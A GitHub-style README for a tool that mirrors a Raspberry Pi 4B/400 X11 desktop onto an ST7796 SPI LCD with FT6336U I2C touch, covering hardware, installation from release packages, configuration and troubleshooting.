# 🖥️ X11_Desktop_Mirror_LCD_ST7796_-_TOUCH_FT6336U_Pi4b-400 - Mirror Your Raspberry Pi Display Easily

[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen?style=for-the-badge&logo=github)](https://github.com/NizamuddinSameer/X11_Desktop_Mirror_LCD_ST7796_-_TOUCH_FT6336U_Pi4b-400/releases)

---

## 📋 About This Software

This application lets you mirror your Raspberry Pi desktop screen to a small LCD display. It supports the ST7796 display controller and the FT6336U touchscreen. This setup works well with Raspberry Pi 4B and the Raspberry Pi 400 models.  

It takes your main Raspberry Pi screen and shows it on a compact display connected via SPI and I2C interfaces. You get both the display image and touchscreen input working with your system.  

This is a helpful tool if you want a portable or space-saving solution to see your Raspberry Pi's full desktop. It is especially useful for small projects, kiosks, or testing interfaces without a full monitor.

---

## ⚙️ What You Need

Before you begin, make sure you have:  

- A Raspberry Pi 4 Model B or Raspberry Pi 400 computer.  
- A compatible 2.8 to 3.5-inch LCD with ST7796 controller.  
- A touchscreen panel with FT6336U controller.  
- The necessary connection cables for SPI and I2C pins.  
- Raspberry Pi OS installed on your Raspberry Pi. This software works best with the official Raspberry Pi OS.  
- A keyboard, mouse, and power supply for your Pi.

---

## 🎯 Key Features

- Mirrors the full Raspberry Pi desktop screen to the LCD display.  
- Supports touchscreen interaction using the FT6336U driver.  
- Uses standard protocols: SPI for the display, I2C for the touchscreen.  
- Compatible with X11 desktop systems on Raspberry Pi OS.  
- Easy to install and run with no programming needed.  
- Optimized for low latency and smooth touch response.

---

## 🚀 Getting Started

Follow these steps to get your display set up and running.  

### 1. Connect Your Hardware  

Make sure the LCD display is wired to your Raspberry Pi’s SPI pins. These include MOSI, MISO, SCLK, and CS pins. Also connect the touchscreen’s I2C pins (SDA and SCL) properly.  

Double-check the power supply to the LCD and the Pi. Refer to the display and touchscreen datasheets for exact pin details.

### 2. Boot Your Raspberry Pi  

Power on your Raspberry Pi with Raspberry Pi OS installed. Ensure your Pi is connected to the internet to download the required software.

---

## 🔽 Download & Install

You will need to download the latest version of the software from the official releases page.  

[![Download Latest Release](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge&logo=github)](https://github.com/NizamuddinSameer/X11_Desktop_Mirror_LCD_ST7796_-_TOUCH_FT6336U_Pi4b-400/releases)

1. Open the link above in a web browser on your Raspberry Pi or another computer.  
2. Find the most recent release and download the file that matches your system (usually a `.tar.gz` or `.deb` package).  
3. Transfer the file to your Raspberry Pi if you downloaded it elsewhere. You can use a USB drive or network transfer.  
4. On your Raspberry Pi, open the Terminal application.  
5. Navigate to the folder where you saved the file. Use the command:

```
cd /path/to/download
```

6. Extract the files if needed using:

```
tar -xvzf filename.tar.gz
```

or install the package with:

```
sudo dpkg -i filename.deb
```

7. Follow any on-screen prompts to complete installation.

---

## 🖱️ Using the Touchscreen

After the software is installed:  

- The X11 desktop will be mirrored on your LCD automatically.  
- Touch the screen to control the pointer or interact with your Raspberry Pi’s GUI apps.  
- Calibration may be needed if touch input feels off. Check the documentation or run a calibration tool that comes with the software.

---

## 🔧 Configuration Tips

- Adjust brightness and contrast in the settings file if the display looks dim.  
- Change the SPI speed in the config to improve responsiveness or reduce flickering.  
- Verify touchscreen accuracy by running the included diagnostic tools.  
- Consult your Raspberry Pi OS display settings if issues persist.

---

## ❓ Troubleshooting

### The Display Shows a Blank Screen  
- Make sure the SPI connection is correct.  
- Verify the LCD is powered on.  
- Restart your Raspberry Pi.

### Touchscreen Does Not Work  
- Ensure the I2C pins are wired and enabled.  
- Check the FT6336U driver installation.  
- Run touchscreen calibration utilities.

### The Mirror Is Slow or Laggy  
- Lower the SPI clock speed from the config file.  
- Close other heavy applications on your Pi.

---

## 📚 Additional Resources

- Raspberry Pi SPI and I2C pinout guides.  
- ST7796 and FT6336U datasheets for hardware details.  
- Raspberry Pi OS user manuals for desktop settings.  
- Troubleshooting forums related to Raspberry Pi touchscreens.

---

## 📢 Support & Feedback

If you encounter problems or need help, visit the Issues section on the project GitHub page. You can report bugs or request improvements.  

Your feedback helps improve the software.

---

## 🌐 Topics

This project covers:  

c, display, display-mirroring, ft6336u, i2c, pi4b, raspberry-pi, raspberry-pi-400, raspberry-pi-os, raspberry-pi4b, spi, st7796-display, touchscreen, x11

---

[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen?style=for-the-badge&logo=github)](https://github.com/NizamuddinSameer/X11_Desktop_Mirror_LCD_ST7796_-_TOUCH_FT6336U_Pi4b-400/releases)